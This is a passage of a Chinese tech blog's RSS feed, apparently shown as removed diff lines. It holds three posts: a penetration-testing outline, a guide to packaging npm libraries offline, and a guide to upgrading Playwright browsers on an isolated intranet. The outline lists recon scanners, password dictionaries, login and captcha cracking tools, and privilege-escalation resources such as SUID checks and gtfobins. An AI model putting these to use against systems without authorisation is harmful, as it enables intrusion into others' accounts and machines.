-&lt;p&gt;&lt;a href=&quot;https://github.com/shmilylty/OneForAll&quot;&gt;&lt;code&gt;oneforall&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;</description>
-      
-      
-      
-      <content:encoded><![CDATA[<p>互联网渗透的流程</p><p>信息收集-&gt;突破边界-&gt;横向移动</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h2><p><a href="https://microsoftedge.microsoft.com/addons/detail/mnbndgmknlpdjdnjfmfcdjoegcckoikn"><code>Wappalyzer</code></a>浏览器插件</p><p><a href="https://github.com/EdgeSecurityTeam/EHole">Ehole</a><br>内置指纹规则，识别CMS，可自行添加规则</p><h2 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h2><p><a href="https://fofa.info/"><code>fofa</code></a></p><p><a href="https://hunter.qianxin.com/"><code>鹰图</code></a></p><p><a href="https://github.com/shmilylty/OneForAll"><code>oneforall</code></a></p><h2 id="文件路径扫描"><a href="#文件路径扫描" class="headerlink" title="文件路径扫描"></a>文件路径扫描</h2><p><a href="https://github.com/maurosoria/dirsearch"><code>dirsearch</code></a></p><h2 id="JS文件收集"><a href="#JS文件收集" class="headerlink" title="JS文件收集"></a>JS文件收集</h2><p><a href="https://github.com/momosecurity/FindSomething"><code>FindSomething</code></a></p><h2 id="主机的信息收集"><a href="#主机的信息收集" class="headerlink" title="主机的信息收集"></a>主机的信息收集</h2><p><code>fofa</code></p><p>现在常用的都是<code>java</code> <code>spring</code>，我们可以使用<a href="https://github.com/metaStor/SpringScan"><code>springscan</code></a> <a href="https://github.com/pyroxenites/SpringScan"><code>springscan2</code></a>扫描</p><p><code>fscan</code></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul><li>1.漏洞识别与验证</li><li>2.漏洞利用</li><li>3.渗透后权限提升（权限维持）</li></ul><p>现在项目基本都是java</p><p><a href="https://github.com/pyroxenites/SpringScan">SpringScan</a></p><h3 id="漏洞文库："><a href="#漏洞文库：" class="headerlink" title="漏洞文库："></a>漏洞文库：</h3><p><a href="https://baizesec.github.io/bylibrary/">白阁</a></p><p><a href="https://peiqi.wgpsec.org/dynamic/">佩奇</a></p><h3 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令:"></a>弱口令:</h3><p>常用字典：</p><p><a href="https://github.com/TheKingOfDuck/fuzzDicts">fuzzDicts</a></p><p><a href="https://github.com/wwl012345/PasswordDic">PasswordDic</a></p><p>常用工具：</p><p><code>Burp</code></p><p><a href="https://link.zhihu.com/?target=https://github.com/shack2/SNETCracker/releases">超级弱口令检查工具</a></p><p><a href="https://github.com/f0ng/captcha-killer-modified"><code>captcha-killer-modified</code></a></p><p><a href="https://github.com/sml2h3/ddddocr"><code>ddddocr</code></a></p><p><a href="https://github.com/sml2h3/ocr_api_server"><code>ddddocr_api_server</code></a>一键部署版</p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>1.内核漏洞提权<br><a href="https://github.com/The-Z-Labs/linux-exploit-suggester">linux-exploit-suggester</a></p><p>2.错误配置提权</p><p>SUID</p><p>sudo -l</p><p><a href="https://gtfobins.github.io/">gtfobins</a></p>]]></content:encoded>
-      
-      
-      <category domain="http://blog.xingxiaowu.cn/categories/%E5%AE%89%E5%85%A8/">安全</category>
-      
-      
-      <category domain="http://blog.xingxiaowu.cn/tags/CTF/">CTF</category>
-      
-      <category domain="http://blog.xingxiaowu.cn/tags/%E6%B8%97%E9%80%8F/">渗透</category>
-      
-      
-      <comments>http://blog.xingxiaowu.cn/2023/09/06/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E5%AE%89%E5%85%A8%E4%B9%8B%E6%97%85%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94%E4%BA%92%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>无星的前端之旅（二十八）—— 离线安装npm库</title>
-      <link>http://blog.xingxiaowu.cn/2023/08/18/%E8%87%AA%E5%8A%A8%E5%8C%96/%E6%97%A0%E6%98%9F%E7%9A%84%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B9%8B%E6%97%85%EF%BC%88%E4%BA%94%EF%BC%89%E2%80%94%E2%80%94%20PlayWright%E5%86%85%E7%BD%91%E5%8D%87%E7%BA%A7/</link>
-      <guid>http://blog.xingxiaowu.cn/2023/08/18/%E8%87%AA%E5%8A%A8%E5%8C%96/%E6%97%A0%E6%98%9F%E7%9A%84%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B9%8B%E6%97%85%EF%BC%88%E4%BA%94%EF%BC%89%E2%80%94%E2%80%94%20PlayWright%E5%86%85%E7%BD%91%E5%8D%87%E7%BA%A7/</guid>
-      <pubDate>Fri, 18 Aug 2023 13:06:08 GMT</pubDate>
-      
-      <description>&lt;h1 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h1&gt;&lt;p&gt;上文我们说到了怎么更新&lt;code&gt;ms-playwright&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;本篇我们来聊聊怎么迁移&lt;code&gt;playwright&lt;/code&gt;的版本&lt;/p&gt;
-&lt;p&gt;可能有朋友会奇怪，这有什么难的，把&lt;code&gt;node_modules&lt;/code&gt;跟&lt;code&gt;playwright&lt;/code&gt;相关的库全部移进去不就行了&lt;/p&gt;
-&lt;p&gt;其实也对，但是如果我是&lt;code&gt;pnpm&lt;/code&gt;呢&lt;/p&gt;
-&lt;p&gt;其实虽然这一篇是升级&lt;code&gt;playwright&lt;/code&gt;，但其实更多的是想表达，如何迁移&lt;code&gt;npm&lt;/code&gt;库到离线环境&lt;/p&gt;
-&lt;p&gt;以&lt;code&gt;playwright&lt;/code&gt;为例，下面是我的一些探索&lt;/p&gt;
-&lt;h1 id=&quot;各种包管理工具下的迁移&quot;&gt;&lt;a href=&quot;#各种包管理工具下的迁移&quot; class=&quot;headerlink&quot; title=&quot;各种包管理工具下的迁移&quot;&gt;&lt;/a&gt;各种包管理工具下的迁移&lt;/h1&gt;&lt;p&gt;运气比较好&lt;/p&gt;
-&lt;p&gt;本文成于2023.8.20&lt;/p&gt;</description>
-      
-      
-      
-      <content:encoded><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>上文我们说到了怎么更新<code>ms-playwright</code></p><p>本篇我们来聊聊怎么迁移<code>playwright</code>的版本</p><p>可能有朋友会奇怪，这有什么难的，把<code>node_modules</code>跟<code>playwright</code>相关的库全部移进去不就行了</p><p>其实也对，但是如果我是<code>pnpm</code>呢</p><p>其实虽然这一篇是升级<code>playwright</code>，但其实更多的是想表达，如何迁移<code>npm</code>库到离线环境</p><p>以<code>playwright</code>为例，下面是我的一些探索</p><h1 id="各种包管理工具下的迁移"><a href="#各种包管理工具下的迁移" class="headerlink" title="各种包管理工具下的迁移"></a>各种包管理工具下的迁移</h1><p>运气比较好</p><p>本文成于2023.8.20</p><p>有老哥在2023.8.7总结了一次</p><p>节省了我很大的时间</p><p><a href="https://lzw.me/a/npm-install-private-offline.html">npm 仓库私有包离线化安装方案</a></p><p>其中<code>yarn</code>我没测试过，<code>npm</code>稍有不准，<code>pnpm</code>可行</p><p>这其中，<code>npm</code>提到了一个库<code>npm-package-privatify</code></p><hr><p>ps:</p><p>我估摸着作者应该是这位小哥<a href="https://juejin.cn/post/7021097811491946503">jjjona0215</a></p><p>虽然他在文中说到，不用关心解决了什么问题哈哈哈</p><p><img src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E8%87%AA%E5%8A%A8%E5%8C%965/1.png" alt="1"></p><hr><p>为什么说<code>npm</code>稍有不准呢，因为<code>npm-package-privatify</code>并不会打包<code>npm</code>目标库的依赖库，作者的目标是解决私有库的问题，确实只是相似而不是同一目标，但是他给出了一些方向上的指引</p><h1 id="本地库的加载"><a href="#本地库的加载" class="headerlink" title="本地库的加载"></a>本地库的加载</h1><p><a href="https://lzw.me/a/npm-install-private-offline.html">npm 仓库私有包离线化安装方案</a>和<br><a href="http://www.cuketest.com/zh-cn/shared/npm_offline">离线环境安装npm包</a>，<a href="https://newsn.net/say/npm-install-offline.html">如何以tar.gz的形式离线安装npm包？</a></p><p>中，我们不难发现，包管理工具是支持通过<code>tar.gz</code>或者<code>tgz</code>加载的</p><p>那么我们的问题，其实变成了，如何生成<code>tar.gz</code>或者<code>tgz</code>库</p><hr><p>ps:</p><p><code>npm-pack-all</code> 我试过了，相当不好用</p><hr><h1 id="压缩包的生成"><a href="#压缩包的生成" class="headerlink" title="压缩包的生成"></a>压缩包的生成</h1><p>其实这一步是最离谱的</p><p>说实话，我一直认为这是个简单打包命令</p><p><code>cd</code>到<code>node_modules</code>下面的库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zcvf &lt;yourname&gt;.tar.gz &lt;yourpath&gt;</span><br></pre></td></tr></table></figure><p>这样做确实能得到<code>tar.gz</code>包</p><p>但是当你通过<code>pnpm</code>或者其他工具安装时</p><p>你会发现<code>package.json</code>里的库名变成了操蛋的<code>xxx.tar.gz</code></p><p>用起来各种报错</p><p>那么我们还有接下来几种方案</p><h2 id="方式1-使用代码生成tar-gz"><a href="#方式1-使用代码生成tar-gz" class="headerlink" title="方式1.使用代码生成tar.gz"></a>方式1.使用代码生成<code>tar.gz</code></h2><p><code>tar</code>命令不靠谱，但是我试用<code>npm-package-privatify</code>发现，它打的<code>tar.gz</code>我能正常引入</p><p>关键代码如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs-extra&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> compressing = <span class="built_in">require</span>(<span class="string">&#x27;compressing&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将文件压缩为.tar.gz</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">*</span>&#125; fileName 需要打包的npm库名</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">*</span>&#125; packagePath 待打包的路径，到node_modules即可</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">*</span>&#125; zipFileName 打包后压缩包名字</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">tarGz</span> = <span class="keyword">async</span> (<span class="params">fileName, packagePath, zipFileName</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">await</span> compressing.<span class="property">tar</span>.<span class="title function_">compressDir</span>(</span><br><span class="line">        path.<span class="title function_">join</span>(packagePath, fileName),</span><br><span class="line">        path.<span class="title function_">join</span>(packagePath, <span class="string">`<span class="subst">$&#123;zipFileName&#125;</span>.tar`</span>)</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">await</span> compressing.<span class="property">gzip</span>.<span class="title function_">compressFile</span>(</span><br><span class="line">        path.<span class="title function_">join</span>(packagePath, <span class="string">`<span class="subst">$&#123;zipFileName&#125;</span>.tar`</span>),</span><br><span class="line">        path.<span class="title function_">join</span>(packagePath, <span class="string">`<span class="subst">$&#123;zipFileName&#125;</span>.tar.gz`</span>)</span><br><span class="line">    )</span><br><span class="line">    fs.<span class="title function_">removeSync</span>(path.<span class="title function_">join</span>(packagePath, <span class="string">`<span class="subst">$&#123;zipFileName&#125;</span>.tar`</span>))</span><br><span class="line">    <span class="comment">// fs.removeSync(path.join(packagePath, fileName))</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>诶，就正常了</p><h2 id="方式2-直接从npm仓库下载"><a href="#方式2-直接从npm仓库下载" class="headerlink" title="方式2.直接从npm仓库下载"></a>方式2.直接从<code>npm</code>仓库下载</h2><p>打开<code>package-lock.json</code>会发现</p><p>我们要的库其实都是<code>tgz</code>压缩包，直接下载就行了</p><p><img src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E8%87%AA%E5%8A%A8%E5%8C%965/2.png" alt="2"></p><p>而且你会惊讶的发现，下载下来是可以通过包管理工具加载成功的</p><hr><p>到这里是不是以为这就完事大吉了，两种方式都可以得到压缩包</p><p>NO</p><p>你会发现，这个压缩包只是单纯的压缩包，它不包含任何自身所需的依赖啊我去</p><p>所以我们还需要对<code>playwright</code>的依赖打包，并且修改<code>package.json</code>的依赖为<code>file</code></p><p>这里所幸我需要的库仅为<code>playwright-core</code>，且这个库没有任何其他的依赖</p><p>那么我需要的就是</p><ul><li>1.下载<code>playwright-core</code>的<code>tgz</code>包</li><li>2.修改<code>playwright</code>的<code>package.json</code>的依赖为<code>file:</code>类型</li><li>3.给<code>playwright</code>打包</li></ul><p>这里一定要注意第2点，因为一般执行<code>npm install</code>等其他命令时，都在项目根目录下执行</p><p>所以依赖的<code>file:</code>一定要写准备把<code>playwright-core</code>放在什么目录安装</p><p>例如，我准备把两个压缩包，都放在一个特定的文件下<code>workspace/OfflineLibrary/playwright/</code></p><p><img src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E8%87%AA%E5%8A%A8%E5%8C%965/3.png" alt="3.png"></p><p>那么我在打包的时候，就需要写为<code>file:OfflineLibrary/playwright/playwright-core-1.37.1.tgz</code><br><img src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E8%87%AA%E5%8A%A8%E5%8C%965/4.png" alt="4.png"></p><p>这里我给个<code>playwright@1.37.1</code>的产物包，大伙有需要的可以试一下断网安装</p><p><a href="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E8%87%AA%E5%8A%A8%E5%8C%965/playwright-1.37.1.tar.gz">playwright-1.37.1.tar.gz</a></p><p><a href="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E8%87%AA%E5%8A%A8%E5%8C%965/playwright-core-1.37.1.tgz">playwright-core-1.37.1.tgz</a></p><p>在项目根目录下，新建两个文件夹<code>OfflineLibrary/playwright</code>，将两个包丢进去，然后在项目根目录下执行<code>pnpm add ./OfflineLibrary/playwright/playwright-1.37.1.tar.gz</code>就可以成功安装了。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>到此为止，我们应该知道怎么去做npm库的离线包了</p><p>比如我们需要对库<code>A</code>做离线包</p><ul><li>1.下载<code>A</code>的所有依赖库，并打压缩包</li><li>2.修改<code>A</code>的依赖项为<code>file</code>路径</li><li>3.将<code>A</code>打压缩包</li><li>4.将所有的依赖包丢到目标仓库进行安装</li></ul><p>到目前我没找到称手的工具，可能需要按这个思路自己写一个吧（摊手）</p><p>如果有老哥老姐知道有写好的工具，麻烦丢一份给我，感谢</p>]]></content:encoded>
-      
-      
-      <category domain="http://blog.xingxiaowu.cn/categories/PlayWright/">PlayWright</category>
-      
-      
-      <category domain="http://blog.xingxiaowu.cn/tags/PlayWright/">PlayWright</category>
-      
-      
-      <comments>http://blog.xingxiaowu.cn/2023/08/18/%E8%87%AA%E5%8A%A8%E5%8C%96/%E6%97%A0%E6%98%9F%E7%9A%84%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B9%8B%E6%97%85%EF%BC%88%E4%BA%94%EF%BC%89%E2%80%94%E2%80%94%20PlayWright%E5%86%85%E7%BD%91%E5%8D%87%E7%BA%A7/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>无星的自动化之旅（四）—— PlayWright内网升级ms-playwright</title>
-      <link>http://blog.xingxiaowu.cn/2023/08/18/%E8%87%AA%E5%8A%A8%E5%8C%96/%E6%97%A0%E6%98%9F%E7%9A%84%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B9%8B%E6%97%85%EF%BC%88%E5%9B%9B%EF%BC%89%E2%80%94%E2%80%94%20PlayWright%E5%86%85%E7%BD%91%E5%8D%87%E7%BA%A7/</link>
-      <guid>http://blog.xingxiaowu.cn/2023/08/18/%E8%87%AA%E5%8A%A8%E5%8C%96/%E6%97%A0%E6%98%9F%E7%9A%84%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B9%8B%E6%97%85%EF%BC%88%E5%9B%9B%EF%BC%89%E2%80%94%E2%80%94%20PlayWright%E5%86%85%E7%BD%91%E5%8D%87%E7%BA%A7/</guid>
-      <pubDate>Fri, 18 Aug 2023 13:06:08 GMT</pubDate>
-      
-      <description>&lt;h1 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h1&gt;&lt;p&gt;事情是这样的，因为工作的重复率太高，我不得不开发一些脚本来 &lt;del&gt;摸鱼&lt;/del&gt; 提高工作效率&lt;/p&gt;
-&lt;p&gt;但是问题是这样的&lt;/p&gt;
-&lt;p&gt;我在的单位内外网是隔离的，我所在的分支机构没有开发人员，总部有研发中心，但是并不会理会我们这些分支机构&lt;/p&gt;
-&lt;p&gt;内网的&lt;code&gt;npm&lt;/code&gt;私有库有一个很老的&lt;code&gt;playwright@1.23.4&lt;/code&gt;版本，而我的脚本需要用到一些比较新的特性&lt;/p&gt;
-&lt;p&gt;我拥有的设备&lt;/p&gt;
-&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;内网机：&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;统信UOS（主要跑脚本的机子）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Windows10（办公常用）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;外网机：&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Windows11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;自己的设备：&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;MacOS（Intel版）&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-
-&lt;p&gt;而不同版本的&lt;code&gt;playwright&lt;/code&gt;依赖的&lt;code&gt;webdriver&lt;/code&gt;又不一样&lt;/p&gt;
-&lt;p&gt;而我集齐了&lt;code&gt;windows&lt;/code&gt;,&lt;code&gt;mac&lt;/code&gt;,&lt;code&gt;linux&lt;/code&gt;三种设备。。。&lt;/p&gt;
-&lt;p&gt;这就意味着我不太好下载对应版本的&lt;code&gt;ms-playwright&lt;/code&gt;（总不能为了下载对应的&lt;code&gt;webdriver&lt;/code&gt;去装个虚拟机吧）&lt;/p&gt;</description>
-      
-      
-      
-      <content:encoded><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>事情是这样的，因为工作的重复率太高，我不得不开发一些脚本来 <del>摸鱼</del> 提高工作效率</p><p>但是问题是这样的</p><p>我在的单位内外网是隔离的，我所在的分支机构没有开发人员，总部有研发中心，但是并不会理会我们这些分支机构</p><p>内网的<code>npm</code>私有库有一个很老的<code>playwright@1.23.4</code>版本，而我的脚本需要用到一些比较新的特性</p><p>我拥有的设备</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">内网机：</span><br><span class="line">统信UOS（主要跑脚本的机子）</span><br><span class="line">Windows10（办公常用）</span><br><span class="line"></span><br><span class="line">外网机：</span><br><span class="line">Windows11</span><br><span class="line"></span><br><span class="line">自己的设备：</span><br><span class="line">MacOS（Intel版）</span><br></pre></td></tr></table></figure><p>而不同版本的<code>playwright</code>依赖的<code>webdriver</code>又不一样</p><p>而我集齐了<code>windows</code>,<code>mac</code>,<code>linux</code>三种设备。。。</p><p>这就意味着我不太好下载对应版本的<code>ms-playwright</code>（总不能为了下载对应的<code>webdriver</code>去装个虚拟机吧）</p><h1 id="1-确认webdriver放置的位置"><a href="#1-确认webdriver放置的位置" class="headerlink" title="1.确认webdriver放置的位置"></a>1.确认<code>webdriver</code>放置的位置</h1><p><a href="https://playwright.dev/docs/browsers#managing-browser-binaries">管理浏览器二进制文件</a></p><h1 id="2-如何获取不同系统的webdriver"><a href="#2-如何获取不同系统的webdriver" class="headerlink" title="2.如何获取不同系统的webdriver"></a>2.如何获取不同系统的<code>webdriver</code></h1><p>首先，我们需要知道下载那些浏览器，以及这些浏览器的版本号和包名</p><p><a href="https://playwright.dev/docs/browsers#install-system-dependencies">需要安装的浏览器</a></p><p>我们可以通过<br><code>npx playwright install --help</code><br>或<br><code>pnpm dlx playwright install --help</code><br>查看可以安装的浏览器和版本</p><h2 id="2-1-如何确定要安装哪些浏览器"><a href="#2-1-如何确定要安装哪些浏览器" class="headerlink" title="2.1 如何确定要安装哪些浏览器"></a>2.1 如何确定要安装哪些浏览器</h2><p>其实这个要看你自己，因为在启动的代码有<code>channel</code>指定需要用的浏览器</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> browser = <span class="keyword">await</span> chromium.<span class="title function_">launch</span>(&#123;</span><br><span class="line">        <span class="attr">headless</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="comment">// 使用edge浏览器</span></span><br><span class="line">        <span class="attr">channel</span>: <span class="string">&#x27;msedge&#x27;</span>,</span><br><span class="line">        <span class="comment">// 开启控制台。不然无法自动播放视频</span></span><br><span class="line">        <span class="attr">devtools</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">args</span>: [<span class="string">&quot;--start-maximized&quot;</span>,]</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>一般是推荐下载<code>chromium</code> <code>firefox</code> <code>webkit</code>这三个，基本能覆盖需求。</p><p>当然如果你不需要其中的某个，也可以不下载，实测是不会影响代码运行的。</p><h2 id="2-2-确定当前playwright依赖的webdriver版本号"><a href="#2-2-确定当前playwright依赖的webdriver版本号" class="headerlink" title="2.2 确定当前playwright依赖的webdriver版本号"></a>2.2 确定当前<code>playwright</code>依赖的<code>webdriver</code>版本号</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pnpm dlx playwright@version install webdriver</span><br></pre></td></tr></table></figure><p>这里我以当前最新版本<code>1.37.1</code>下载<code>chromium</code>举例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pnpm dlx playwright@1.37.1 install chromium</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E8%87%AA%E5%8A%A8%E5%8C%964/1.png" alt="1.png"></p><p>可能看不太清，我复制出来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://playwright.azureedge.net/builds/chromium/1076/chromium-mac.zip</span><br></pre></td></tr></table></figure><p>可以通过这种方式，了解当前<code>playwright</code>依赖的<code>webdriver</code>版本，例如我这个就是<code>1076</code></p><p>那么我只要下载对应的链接解压到<code>ms-playwright</code>即可</p><h2 id="2-3-那么如何下载其他系统需要的webdriver呢？"><a href="#2-3-那么如何下载其他系统需要的webdriver呢？" class="headerlink" title="2.3 那么如何下载其他系统需要的webdriver呢？"></a>2.3 那么如何下载其他系统需要的<code>webdriver</code>呢？</h2><p>除了用相关的系统以外，我们还可以通过查看源码的方式去确认其他系统的下载路径</p><p>源码地址：<a href="https://github.com/microsoft/playwright/blob/main/packages/playwright-core/src/server/registry/index.ts">Github.playwright</a></p><p>文件路径:<code>playwright/packages/playwright-core/src/server/registry/index.ts</code></p><p>这里就是我们下载的各种<code>webdriver</code>路径了</p><p><img src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E8%87%AA%E5%8A%A8%E5%8C%964/2.png" alt="2"></p><p>我们可以看到，各种系统，还有各种版本</p><p>这时候可能还是不知道怎么查看，怎么办?</p><p>那我们可以先新建一个项目，然后下载<code>playwright</code>作为依赖</p><p>在<code>node_modules</code>里面找到<code>playwright-core</code>，单独将它打开</p><p>这里因为我用的是<code>pnpm</code>，路径都是<code>link</code>的，所以我需要找到原项目<br><img src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E8%87%AA%E5%8A%A8%E5%8C%964/3.png" alt="3"></p><p><img src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E8%87%AA%E5%8A%A8%E5%8C%964/4.png" alt="4"><br><img src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E8%87%AA%E5%8A%A8%E5%8C%964/5.png" alt="5"><br><img src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E8%87%AA%E5%8A%A8%E5%8C%964/6.png" alt="6"></p><p>并用<code>vscode</code>打开它</p><p><img src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E8%87%AA%E5%8A%A8%E5%8C%964/7.png" alt="7"></p><p>我们直接访问<code>playwright-core/src/server/registry/index.ts</code></p><p>前面的解析过程比较无聊，无非是找关键字，判断系统啊，下载路径拼接之类的，我这里就直接跳过，只点出几个关键的地方</p><h3 id="2-3-1-构造函数"><a href="#2-3-1-构造函数" class="headerlink" title="2.3.1 构造函数"></a>2.3.1 构造函数</h3><p><img src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E8%87%AA%E5%8A%A8%E5%8C%964/8.png" alt="8"><br>关键在<code>Registry</code>的构造函数里</p><p>其中有一个<code>_executables</code></p><p>所有最后构造出来的下载路径都被push到<code>_executables</code>中了</p><p>因此我们到构造函数的末尾，添加一下<code>_executables</code>的遍历打印，即可打印出所有的下载路径</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 打印所有下载路径</span></span><br><span class="line">   <span class="variable language_">this</span>.<span class="property">_executables</span>.<span class="title function_">forEach</span>(<span class="function">(<span class="params">item</span>)=&gt;</span>&#123;</span><br><span class="line">     <span class="variable language_">console</span>.<span class="title function_">log</span>(item.<span class="property">downloadURLs</span>?.[<span class="number">0</span>]);</span><br><span class="line">   &#125;)</span><br></pre></td></tr></table></figure><p>然后用<code>vscode</code>启动当前这个<code>index</code>文件</p><p><img src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E8%87%AA%E5%8A%A8%E5%8C%964/9.png" alt="9"></p><p><img src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E8%87%AA%E5%8A%A8%E5%8C%964/10.png" alt="10"></p><p>显而易见，所有的下载路径都被打印出来了</p><p>但是问题来了，我这都是当前系统的，其他系统的呢？</p><h3 id="2-3-2-系统判断hostPlatform"><a href="#2-3-2-系统判断hostPlatform" class="headerlink" title="2.3.2 系统判断hostPlatform"></a>2.3.2 系统判断<code>hostPlatform</code></h3><p>地址：<code>lib/utils/hostPlatform</code><br><img 